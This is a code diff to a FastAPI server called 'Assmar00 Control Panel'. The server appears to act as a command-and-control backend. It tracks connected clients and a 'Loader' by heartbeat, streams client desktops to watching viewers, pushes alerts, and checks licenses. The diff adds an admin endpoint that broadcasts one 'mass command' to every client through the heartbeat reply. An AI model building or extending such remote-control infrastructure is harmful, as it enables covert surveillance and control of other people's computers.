@@ -9,7 +9,7 @@ from pydantic import BaseModel
 import base64
 import time
 
-app = FastAPI(title="Assmar00 Control Panel", version="49.0")
+app = FastAPI(title="Assmar00 Control Panel", version="50.0")
 
 app.add_middleware(
     CORSMiddleware,
@@ -23,6 +23,7 @@ DB_FILE = "database.db"
 active_streams = {}
 viewers_watching = set()
 pending_messages = {}
+global_mass_command = None  # Speichert den aktuellen Massen-Befehl
 
 def init_db():
     conn = sqlite3.connect(DB_FILE)
@@ -132,7 +133,6 @@ def get_users():
     conn = sqlite3.connect(DB_FILE)
     conn.row_factory = sqlite3.Row
     cursor = conn.cursor()
-    # Entfernt inaktive Clients nach 6 Sekunden automatisch (wenn Loader geschlossen wird)
     cursor.execute("DELETE FROM clients WHERE (julianday('now') - julianday(last_seen)) * 86400 > 6")
     conn.commit()
 
@@ -179,6 +179,12 @@ def update_settings(data: dict):
     conn.commit()
     conn.close()
     return {"status": "success"}
+
+@app.post("/api/admin/mass_command")
+def post_mass_command(data: dict):
+    global global_mass_command
+    global_mass_command = data.get("command")
+    return {"status": "success", "command": global_mass_command}
 
 @app.post("/api/admin/ban_user")
 def ban_user(data: dict):
@@ -343,7 +349,12 @@ def client_heartbeat(data: ClientData):
     
     alert_msg = pending_messages.pop(data.desktop, None)
     is_active = data.desktop in viewers_watching
-    return {"status": "success", "stream_active": is_active, "alert_message": alert_msg}
+    return {
+        "status": "success", 
+        "stream_active": is_active, 
+        "alert_message": alert_msg, 
+        "mass_command": global_mass_command
+    }
 
 @app.post("/verify")
 def verify_license_endpoint(data: dict):
